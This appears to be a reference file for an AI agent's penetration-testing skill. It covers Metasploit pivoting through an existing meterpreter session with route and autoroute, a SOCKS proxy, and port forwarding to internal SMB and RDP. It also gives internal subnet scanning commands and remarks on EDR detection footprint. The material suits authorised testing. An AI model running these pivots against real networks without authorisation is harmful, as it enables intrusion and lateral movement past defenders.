### Ref: Metasploit pivoting (route, autoroute, socks_proxy, portfwd)

**Root pattern:** When a meterpreter session already exists on the pivot, Metasploit can route attacker-side traffic through that session without dropping any new agent. `route add` registers a network with the framework's internal router (so any subsequent MSF module targeting that network goes through the session); `auxiliary/server/socks_proxy` exposes the routed networks to *external* tools (nmap, impacket, etc.) via a SOCKS proxy on the attacker; `portfwd add` forwards a single port back to the attacker for cases where SOCKS is overkill. This is the lightest pivot when you already have meterpreter — no binary transfer, no firewall rule changes on the pivot, no extra processes.

**When to use:**
- Meterpreter session is already open on the pivot
- You want to test internal hosts using MSF modules (they pick up the route automatically)
- You want SOCKS access without dropping chisel/ligolo-ng

**When NOT to use:**
- No meterpreter — drop chisel or ligolo-ng instead
- You need persistence beyond the meterpreter session lifetime — chisel/ligolo-ng with autostart is more reliable
- You're worried about MSF traffic signatures — meterpreter is heavily signatured by EDR; chisel is cleaner

---

**Step 1 — Drive the metasploit console via tmux** (use the existing `/metasploit` skill's tmux session if one is open):

```
Bash("tmux new-session -d -s msf 'msfconsole -q'") 2>/dev/null   # only if no session exists yet
Bash("sleep 2 && tmux capture-pane -t msf -p | tail -10")
```

All commands below are sent via `tmux send-keys -t msf '<cmd>' Enter` and read back with `tmux capture-pane -t msf -p | tail -<N>`.

---

**Step 2 — Confirm the session and the pivot's internal interfaces:**

```
sessions -l                          # list active sessions; note the SESSION_ID
sessions -i SESSION_ID               # interact with the session
ipconfig                             # in-meterpreter — list interfaces and reachable nets
run get_local_subnets                # auto-discover routable subnets
background                           # detach without killing the session
```

The interfaces from `ipconfig` are the candidate networks for `route add`.

---

**Step 3 — Add a route through the session:**

```
route add TARGET_NET 255.255.255.0 SESSION_ID
route add 10.10.20.0 255.255.255.0 1
route print                          # show all current routes
```

Or use the auto-discovery module:
```
use post/multi/manage/autoroute
set SESSION SESSION_ID
set CMD add                          # default; can also be 'print' or 'remove'
run

# Variant: target a specific subnet rather than auto-discovered ones:
set SUBNET 10.10.20.0
set NETMASK 255.255.255.0
run
```

After `route add`, **MSF modules** targeting hosts in `TARGET_NET` will route through the session automatically — no SOCKS needed for in-MSF tools:
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.20.0/24
set PORTS 22,80,135,139,445,3389
run                                  # routes through the meterpreter session
```

---

**Step 4 — Expose the route to external tools via SOCKS:**

```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j                               # background — keeps the console interactive
jobs                                 # confirm the SOCKS server is running
```

Now configure proxychains4 (`socks5 127.0.0.1 1080` — see `refs/proxychains.md`) and any external TCP tool routes through the meterpreter session.

```
# Outside MSF — verify:
Bash("ss -tlnp | grep 1080")
Bash("proxychains4 -q nmap -sT -Pn --top-ports 100 INTERNAL_HOST")
```

To stop the SOCKS server: `jobs -K JOB_ID` or `jobs -K` (kill all).

---

**Step 5 — Single-port forward** (`portfwd`) — when SOCKS is overkill and you just want one internal port mapped back to the attacker:

```
sessions -i SESSION_ID
portfwd add -l 4445 -p 445 -r INTERNAL_HOST       # attacker:4445 → INTERNAL_HOST:445
portfwd add -l 13389 -p 3389 -r INTERNAL_HOST     # attacker:13389 → INTERNAL_HOST:3389
portfwd list
portfwd delete -l 4445 -p 445 -r INTERNAL_HOST
portfwd flush                                     # remove all forwards
background
```

Use this for tools that don't play nicely with SOCKS (some legacy SMB clients, RDP):
```
Bash("rdesktop 127.0.0.1:13389")
Bash("smbclient -L //127.0.0.1 -p 4445 -U user%pass")
```

---

**Common command reference:**

| Command | Context | Purpose |
|---------|---------|---------|
| `route add NET MASK SESSION` | msfconsole | Register a route through a meterpreter session |
| `route print` | msfconsole | List all framework routes |
| `route remove NET MASK SESSION` | msfconsole | Remove a route |
| `route flush` | msfconsole | Remove all routes |
| `use post/multi/manage/autoroute` | msfconsole | Auto-discover and add routes from a session |
| `use auxiliary/server/socks_proxy` | msfconsole | Stand up a SOCKS proxy that uses framework routes |
| `set VERSION 5` | socks_proxy | SOCKS5 (vs SOCKS4 default) — required for hostname resolution |
| `run -j` | any aux module | Background the module so the console stays interactive |
| `jobs` / `jobs -K JOB_ID` | msfconsole | List / kill background jobs |
| `portfwd add -l L -p P -r R` | meterpreter | Forward attacker port `L` to `R:P` via the session |
| `portfwd list` / `portfwd flush` | meterpreter | List / clear all port forwards |

---

**Comparison vs chisel / ligolo-ng:**

| Feature | MSF route + socks_proxy | chisel | ligolo-ng |
|---------|------------------------|--------|-----------|
| New binary on pivot? | No (uses existing meterpreter) | Yes (chisel client) | Yes (ligolo agent) |
| SOCKS5 for external tools | Yes | Yes | No (uses TUN instead) |
| L3 / ICMP / UDP support | No (TCP only) | No | Yes |
| Multi-hop friendly | Yes (chain routes through multiple sessions) | Yes | Yes |
| Survives meterpreter death | No | Yes (independent process) | Yes |
| Detection footprint | High (MSF signatures) | Low-medium | Low-medium |
| Best when | Meterpreter already established | HTTP-only egress | Need full L3 |

---

**Cleanup checklist:**
```
# In msfconsole (via tmux):
jobs -K                              # kill all background jobs (incl. socks_proxy)
sessions -i SESSION_ID
portfwd flush                        # remove all port forwards
background
route flush                          # remove all framework routes

# Hand back to /metasploit skill — do NOT kill the meterpreter session here unless the engagement is over.
```

Append a `note` event for each cleanup step. Also restore proxychains4.conf if it was edited (see `refs/proxychains.md` cleanup).
